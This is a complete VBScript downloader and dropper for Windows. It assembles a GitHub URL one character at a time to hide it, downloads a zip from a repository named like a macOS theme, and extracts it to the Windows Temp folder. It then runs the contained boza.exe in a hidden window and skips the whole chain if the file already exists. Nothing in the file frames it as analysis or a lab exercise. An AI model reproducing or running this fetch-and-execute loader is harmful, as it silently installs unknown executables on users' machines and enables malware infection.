Option Explicit

Dim wsh, fso, http, stream
Dim urlArr, i, urlStr
Dim zipPath, extractPath, exePath
Dim osName, waited, shell, zipFile, items

' --- Config ---
zipPath     = "C:\Windows\Temp\package.zip"
extractPath = "C:\Windows\Temp\package"
exePath     = extractPath & "\boza.exe"

' --- 1. OS Check (Windows only) ---
osName = LCase(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%OS%"))
If InStr(osName, "windows") = 0 Then
    WScript.Quit 0
End If

Set wsh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- 2. Idempotence Check (No Rerun) ---
If fso.FileExists(exePath) Then
    WScript.Quit 0
End If

' --- URL reconstruite ---
' https://github.com/metaverse-online/macostheme/raw/refs/heads/main/package.zip
urlArr = Array("h","t","t","p","s",":","/","/","g","i","t","h","u","b",".","c","o","m","/","m","e","t","a","v","e","r","s","e","-","o","n","l","i","n","e","/","m","a","c","o","s","t","h","e","m","e","/","r","a","w","/","r","e","f","s","/","h","e","a","d","s","/","m","a","i","n","/","p","a","c","k","a","g","e",".","z","i","p")
urlStr = ""
For i = 0 To UBound(urlArr)
    urlStr = urlStr & urlArr(i)
Next

' --- Téléchargement ---
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", urlStr, False
http.Send

If http.Status <> 200 Then
    WScript.Echo "Download failed: HTTP " & http.Status
    WScript.Quit 1
End If

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write http.responseBody
stream.SaveToFile zipPath, 2
stream.Close

' --- Extraction ---
If fso.FolderExists(extractPath) Then fso.DeleteFolder extractPath, True
fso.CreateFolder extractPath

Set shell = CreateObject("Shell.Application")
Set zipFile = shell.NameSpace(zipPath)
Set items = zipFile.Items
shell.NameSpace(extractPath).CopyHere items, 4 + 16 + 512 + 1024

' Attendre la fin de l'extraction
waited = 0
Do While Not fso.FileExists(exePath) And waited < 30
    WScript.Sleep 500
    waited = waited + 1
Loop

If Not fso.FileExists(exePath) Then
    WScript.Echo "Extraction failed: boza.exe not found"
    WScript.Quit 1
End If

' --- Lancement ---
wsh.Run """" & exePath & """", 0, False

WScript.Quit 0